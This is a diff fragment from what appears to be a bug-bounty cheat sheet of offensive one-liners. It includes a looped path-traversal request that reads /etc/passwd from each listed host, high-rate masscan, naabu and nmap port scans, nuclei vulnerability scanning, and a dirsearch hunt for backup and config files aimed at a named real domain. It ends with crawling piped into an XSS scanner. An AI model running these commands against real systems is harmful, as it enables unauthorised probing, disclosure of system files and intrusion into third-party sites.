@@ -250,5 +250,18 @@ ffuf -u https://target[.]com/FUZZ -H “Host: 127.0.0.1” -w /home/user/path/to
 ```
 cat file.txt| while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULN";done
 ```
+sudo naabu -list ip_resolver.txt -p 7,20,21,22,23,25,53,69,80,88,102,110,135,137,139,143,381,383,443,464,465,587,593,636,691,902,989,990,993,995,1025,1194,1337,1589,1725,2082,2083,2483,2484,2967,3074,3306,3724,4664,5432,5900,6665,6666,6667,6668,6669,6881,6999,6970,8086,8087,8222,9100,10000,12345,27374,31337 | tee bbcport.txt
+
+masscan -p1-65535 -iL ip_resolver.txt  --max-rate 100000 -oG raj.txt     
+ nmap -iL   ip_resolver.txt -sV -O  -p- -A   
+
+cat ip_resolver.txt | httpx | nuclei -t /home/kali/Desktop/nuclei-templates/
+
+
+cat ip_resolver.txt | httpx --status-code -title | grep "200"
+
+python3 dirsearch.py -e php, asp, aspx.jsp.py, txt, conf, config, bak, backup, swp, old, db, sqlasp, aspx,aspx-,asp-, py,py-, rb, rb, php, php-, bak, bkp, cache, cgi, conf, csv, html, inc, jar, js, json, jsp, jsp-, lock, log, rar, old, sql, sql.gz, sql.zip, sql.tar.gz,sql-, swp, swp-, tar, tar.bz2, tar.gz, txt,wadl, zip -u www.jetking.com  --exclude-status 403,401
+
+cat alldomains.txt  | httpx | katana  -d 5 | tee list.txt | python3 /home/kali/Desktop/tools/xss_vibes/main.py --pipe -t 7 
 
 
